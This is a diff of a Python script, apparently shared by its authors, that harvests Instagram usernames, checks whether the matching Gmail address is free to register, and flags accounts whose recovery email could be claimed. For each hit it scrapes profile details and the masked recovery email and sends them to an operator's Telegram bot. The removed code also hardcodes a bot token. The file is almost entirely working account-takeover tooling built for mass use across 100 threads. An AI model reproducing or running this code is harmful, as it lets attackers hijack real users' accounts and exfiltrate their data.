@@ -1,256 +1,304 @@
 import os
-os.system("pip install requests")
-os.system("pip install hashlib")
-os.system("pip install uuid")
-os.system("pip install user_agent")
-os.system("pip install urllib.request")
-import json
-import random
-import requests
+os.system("pip install colorama")
+from requests import get,post
+from concurrent.futures import ThreadPoolExecutor
+from user_agent import generate_user_agent
+from os import system,remove,name
+from colorama import Fore, Style
+from rich.console import Console
+from requests import post as pp
+from user_agent import generate_user_agent as gg
+from random import choice as cc
+from random import randrange as rr
+import re
 import requests
 from hashlib import md5
-import time
-from uuid import uuid4
-from random import randrange
-from user_agent import generate_user_agent
-import json
-import uuid
-import requests
-from user_agent import generate_user_agent
-from secrets import token_hex
-from uuid import uuid4
-import urllib.request
-from threading import Thread
-uid = uuid4()
-E = '\033[1;31m'
-G = '\033[1;35m'
-Z = '\033[1;31m'  # احمر
-X = '\033[1;33m'  # اصفر
-Z1 = '\033[2;31m'  # احمر ثاني
-F = '\033[2;32m'  # اخضر
-A = '\033[2;34m'  # ازرق
-C = '\033[2;35m'  # وردي
-B = '\x1b[38;5;208m'  # برتقالي
-Y = '\033[1;34m'  # ازرق فاتح
-M = '\x1b[1;37m'  # ابیض
-S = '\033[1;33m'
-U = '\x1b[1;37m'  # ابیض
-BRed = '\x1b[1;31m'
-BGreen = '\x1b[1;32m'
-BYellow = '\x1b[1;33m'
-R = '\x1b[1;34m'
-BPurple = '\x1b[1;35m'
-BCyan = '\x1b[1;36m'
-BWhite = '\x1b[1;37m'
+from time import time
+#------------------------------------------------------------#
+lenked_instgram=0
+unlenked_instgram=0
+available_gmail=0
+unavailable_gmail=0
+number_check=0
+orange_color = '\033[38;5;214m'
+console = Console()
+#------------------------------------------------------------#
+yy='azertyuiopmlkjhgfdsqwxcvbn'
+ids=[]
+def tll():
+  try:
+    n1=''.join(cc(yy)for i in range(rr(6,9)))
+    n2=''.join(cc(yy)for i in range(rr(3,9)))
+    host=''.join(cc(yy)for i in range(rr(15,30)))
+    he3 = {
+      "accept": "*/*",
+      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+      "google-accounts-xsrf": "1",
+      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+      "sec-ch-ua-arch": "\"\"",
+      "sec-ch-ua-bitness": "\"\"",
+      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
+      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
+      "sec-ch-ua-mobile": "?1",
+      "sec-ch-ua-model": "\"ANY-LX2\"",
+      "sec-ch-ua-platform": "\"Android\"",
+      "sec-ch-ua-platform-version": "\"13.0.0\"",
+      "sec-ch-ua-wow64": "?0",
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-origin",
+      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
+      "x-client-data": "CJjbygE=",
+      "x-same-domain": "1",
+      "Referrer-Policy": "strict-origin-when-cross-origin",
+    'user-agent': str(gg()),
+    }
 
-print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
-|{Z}[√] YouTube    : {B}| أحمد الحراني
-|{Z}[√] TeleGram  : {B} maho_s9    |
-|{Z}[√] Instagram  : {B}ahmedalharrani |
-|{Z}[√] Tool  : {B} متاحات-  IG |
-{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')
 
-token = "6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo"
-print(X + ' ═════════════════════════════════  ')
-ID = 749219602
-def info(email):
-    user = email.split('@')[0]
+    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
+    cookies={
+      '__Host-GAPS':host
+    }
     headers = {
-        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
-        'X-Pigeon-Rawclienttime': '1700251574.982',
-        'X-IG-Connection-Speed': '-1kbps',
-        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
-        'X-IG-Bandwidth-TotalBytes-B': '0',
-        'X-IG-Bandwidth-TotalTime-MS': '0',
-        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
-        'X-IG-Connection-Type': 'WIFI',
-        'X-IG-Capabilities': '3brTvw==',
-        'X-IG-App-ID': '567067343352427',
-        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
-        'Accept-Language': 'en-GB, en-US',
-        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Host': 'i.instagram.com',
-        'X-FB-HTTP-Engine': 'Liger',
-        'Connection': 'keep-alive',
-        'Content-Length': '356',
-    }
-
+      'authority': 'accounts.google.com',
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9',
+      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+      'google-accounts-xsrf': '1',
+      'origin': 'https://accounts.google.com',
+      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+      'user-agent': gg(),
+  }
     data = {
-        'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{uuid4()}","guid":"{uuid4()}","device_id":"{uuid4()}","query":"{user}"}}',
-        'ig_sig_key_version': '4',
-    }
-
-    res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
-    if '"status":"ok"' in res.text:
-        rest = res.json()['email']
-    else:
-        rest = 'Band Requests!'
-
+    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+  }
+    response = pp(
+      'https://accounts.google.com/_/signup/validatepersonaldetails',
+      cookies=cookies,
+      headers=headers,
+      data=data,
+  )
+    tl=str(response.text).split('",null,"')[1].split('"')[0]
+    host=response.cookies.get_dict()['__Host-GAPS']
+    try:remove('tl.txt')
+    except:pass
+    with open('tl.txt','a') as f:
+      f.write(tl+'//'+host+'\n')
+  except Exception as e:
+    tll()
+tll()
+def check_gmail(email):
+  if '@' in email:
+    email = str(email).split('@')[0]
+  try:
     try:
-        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
-        port = random.choice(pl)
-        proxy = ip + ":" + str(port)
-        uid = uuid4().hex.upper()
-        csr = token_hex(8) * 2
-        miid = token_hex(13).upper()
-        dtr = token_hex(13)
-        headers = {
-            'accept': '*/*',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'ar,en;q=0.9',
-            'cookie': f'ig_did={uid}; datr={dtr}; mid={miid}; ig_nrcb=1; csrftoken={csr}; ds_user_id=56985317140; dpr=1.25',
-            'referer': f'https://www.instagram.com/{user}/?hl=ar',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': generate_user_agent(),
-            'viewport-width': '1051',
-            'x-asbd-id': '198387',
-            'x-csrftoken': str(csr),
-            'x-ig-app-id': '936619743392459',
-            'x-ig-www-claim': '0',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=headers, proxies={'http': proxy})
-        try:
-            Id = rr.json()['data']['user']['id']
-        except:
-            Id = ""
-        try:
-            name = rr.json()['data']['user']['full_name']
-        except:
-            name = ""
-        try:
-            bio = rr.json()['data']['user']['biography']
-        except:
-            bio = ""
-        try:
-            po = rr.json()['data']['user']['edge_owner_to_timeline_media']['count']
-        except:
-            po = ""
-        try:
-            fols = rr.json()['data']['user']['edge_followed_by']['count']
-        except:
-            fols = ""
-        try:
-            folg = rr.json()['data']['user']['edge_follow']['count']
-        except:
-            folg = ""
-        try:
-            pr = rr.json()['data']['user']['is_private']
-        except:
-            pr = ""
-        try:
-            profile_pic_url = rr.json()['data']['user']['profile_pic_url']
-            profile_pic_path = f"{user}.jpg"
-            urllib.request.urlretrieve(profile_pic_url, profile_pic_path)
-        except:
-            profile_pic_url = ""
-        
-        try:
-            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}")
-            da = re.json()['date']
-        except:
-            da = 'No Date'
+      o=open('tl.txt','r').read().splitlines()[0]
+    except:
+      tll()
+      o=open('tl.txt','r').read().splitlines()[0]
+    tl,host = o.split('//')
+    cookies = {
+    '__Host-GAPS': host
+  }
+    headers = {
+    'authority': 'accounts.google.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+    'google-accounts-xsrf': '1',
+    'origin': 'https://accounts.google.com',
+    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
+    'user-agent': gg(),
+  }
+    params = {
+    'TL': tl,
+  }
+    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+    response = pp(
+    'https://accounts.google.com/_/signup/usernameavailability',
+    params=params,
+    cookies=cookies,
+    headers=headers,
+    data=data,
+  )
+    if '"gf.uar",1' in str(response.text):return 'good'
+    elif '"er",null,null,null,null,400' in str(response.text):
+      tll()
+      check_gmail(email)
+    else:return 'bad'
+  except:check_gmail(email)
+#---------------------------[input]----------------------------#
+ID=input('Enter Your ID : ')
+system('cls' if name == 'nt' else 'clear')
+token=input('Enter Your Token : ')
+system('cls' if name == 'nt' else 'clear')
+#---------------------------[info]-----------------------------#
+def rest(user):
+  try:
+    headers = {
+    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+    'X-Pigeon-Rawclienttime': '1700251574.982',
+    'X-IG-Connection-Speed': '-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+    'X-IG-Bandwidth-TotalBytes-B': '0',
+    'X-IG-Bandwidth-TotalTime-MS': '0',
+    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+    'X-IG-Connection-Type': 'WIFI',
+    'X-IG-Capabilities': '3brTvw==',
+    'X-IG-App-ID': '567067343352427',
+    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+    'Accept-Language': 'en-GB, en-US',
+     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Host': 'i.instagram.com',
+    'X-FB-HTTP-Engine': 'Liger',
+    'Connection': 'keep-alive',
+    'Content-Length': '356',
+}
+    data = {
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'ig_sig_key_version': '4',
+  }
+    response =post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+    r=response['email']
+  except:
+    r='h h h'
+  return r
+def info(username,domen):
+  global hits
+  headers = {
+      'Accept': '*/*',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'Connection': 'keep-alive',
+      'DNT': '1',
+      'Origin': 'https://www.tucktools.com',
+      'Referer': 'https://www.tucktools.com/',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Site': 'cross-site',
+      'User-Agent': generate_user_agent(),
+  }
 
-        tlg = f'''
-HI MAHOS GIVE YOU HIT
-________________________,
-[√] Email ==> {email}
-[√] E-mail Rest ==> {rest}
-[√] Username ==> @{user}
-[√] Name ==> {name}
-[√] ID ==> {Id}
-[√] Followers ==> {fols}
-[√] Following ==> {folg}
-[√] Bio ==> {bio}
-[√] Posts ==> {po}
-[√] Date ==> {da}
-[√] Is Private ==> {pr}
-[√] Url ==> https://www.instagram.com/{user}
-_______BEST DEV_________
-@maho_s9 - @maho9s
+  params = {
+      'username': username,
+  }
+
+  try:
+    response = get('https://instaskull.com/tucktools_user', params=params, headers=headers).json()
+    id=response['id']
+    name=response['user_fullname']  
+    user_followers=response['user_followers']
+    user_following=response['user_following']
+    total_posts=response['total_posts']
+    user_description=response['user_description']
+    try:
+      date=get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
+    except:
+      date='None'
+    tlg = f'''
+⌯ Hi Qredes Got Hit
+ᯓᯓᯓᯓᯓᯓᯓᯓ
+folowers : {user_followers}
+following : {user_following}
+total posts : {total_posts}
+username : {username}
+email : {username}@{domen}
+date : {date}
+id : {id}
+name : {name}
+bio : {user_description}
+rest : {rest(username)}
+ᯓᯓᯓᯓᯓᯓᯓᯓ
+by : @Qredes
 '''
-        print(F+tlg)
-        with open(profile_pic_path, 'rb') as photo:
-            files = {'photo': photo}
-            requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&caption=" + str(tlg), files=files)
-    except Exception as e:
-        print(e)
-        tlg = f'''
- username = {user}
- email = {email}
-        '''
-        requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&text=" + str(tlg))
-        
-    	
-def mahos(email):
-    global ok, error  
-    response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', 
-                         headers={'accept': '*/*',
-                                  'accept-language': 'en-US,en;q=0.9',
-                                  'content-type': 'application/x-www-form-urlencoded',
-                                  'origin': 'https://www.instagram.com',
-                                  'referer': 'https://www.instagram.com/accounts/signup/email/',
-                                  'user-agent': generate_user_agent(),
-                                  'x-csrftoken': md5(str(time.time()).encode()).hexdigest()},
-                         data={'email': email})
-    if 'email_is_taken' in response.text:
-        print(f"{F} Available Instgram : {email}")
-        send(email)                
-    else:
-        print(f"{Z}Bad Insta : {email}")
-def ch(email):
-    global no, hh    
-    res = requests.get(
-    f'https://gmail-mhros-e438ac1b0be7.herokuapp.com/qredes/gmail/?email={email}'
-).text
-    if '"status":"good"' in res:
-        print(f"{B} GOOD Gmail : {email}")
-        mahos(email)                
-    else:
-        print(f"{X}Bad Gmail : {email}")
-        
+    print(tlg)
+    with open('hits1.txt','a') as ff:
+      ff.write(f'{tlg}\n')
+    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    except:pass
+  except:
+    tlg = f'''
+    ⌯ Hi Qredes Got Hit
+    ᯓᯓᯓᯓᯓᯓᯓᯓ
+    username : {username}
+    email : {username}@{domen}
+    rest : {rest(username)}
+    ᯓᯓᯓᯓᯓᯓᯓᯓ
+    by : @Qredes
+    '''
+    print(tlg)
+    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    except:pass
+    with open('hits1.txt','a') as ff:
+      ff.write(f'{tlg}\n')
 
-def get_username():
-    while True:
-        try:
-            id = str(randrange(10000, 30975110))      
-            headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dnt': '1',
-                'dpr': '0.8',
-                'origin': 'https://www.instagram.com',
-                'user-agent': generate_user_agent(),
-                'x-csrftoken': md5(str(time.time()).encode()).hexdigest(),
-            }
-            data = {
-                '__spin_b': 'trunk',
-                'fb_api_caller_class': 'RelayModern',
-                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
-                'variables': '{"userID":"' + id + '","username":"0s9s"}',
-                'server_timestamps': 'true',
-                'doc_id': '7666785636679494',
-            }
-            response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
-            usess = response['data']['user']['username']      
-            email = usess + '@gmail.com'
-            ch(email)
-        except:
-            print('اذا استمرت شغل VPN او طفي النت')
-            pass
-        
-for i in range(3):
-    Thread(target=get_username).start()
+def h_h(email):
+  global lenked_instgram, unlenked_instgram, available_gmail, unavailable_gmail
+  username, domen = email.split('@')
+  try:
+      if check_gmail(username) == 'good':
+        available_gmail += 1
+        csrftoken = md5(str(time()).encode()).hexdigest()
+        ua=generate_user_agent()
+        headers = {
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/accounts/signup/email/',
+        'user-agent': ua,
+        'x-csrftoken': csrftoken
+        }
+        data = {
+        'email': email,
+        }
+        response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
+        if 'email_is_taken' in str(response.text):
+              lenked_instgram += 1
+              info(username, domen)
+        else:unlenked_instgram += 1
+      else:unavailable_gmail += 1
+  except Exception as e:''
+  console.clear()
+  ss = f'''
+  [green]linked instgram:[/] {lenked_instgram}
+  [orange]avilible gmail:[/] {available_gmail}
+  [red]unlinked instgram:[/] {unlenked_instgram}
+  [yellow]unavailable gmail:[/] {unavailable_gmail}
+
+  BY : @Qredes / @K_Q_A / قريديس 
+  '''
+  console.print(ss)
+def main():
+  while True:
+    try:
+      id = str(rr(10000,23282097))
+      lsd=''.join(cc('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(22))
+      headers = {
+          'authority': 'www.instagram.com',
+          'accept': '*/*',
+          'accept-language': 'en-US,en;q=0.9',
+          'content-type': 'application/x-www-form-urlencoded',
+          'origin': 'https://www.instagram.com',
+          'referer': 'https://www.instagram.com/0s9s/',
+          'sec-fetch-site': 'same-origin',
+          'user-agent': generate_user_agent(),
+          'x-fb-lsd': lsd,
+      }
+      data = {
+          'lsd': lsd,
+          'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
+          'doc_id': '8257302777620075',
+      }
+
+      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
+      email=username+'@gmail.com'
+      h_h(email)
+    except:''
+from threading import Thread
+for _ in range(100):
+  Thread(target=main).start()
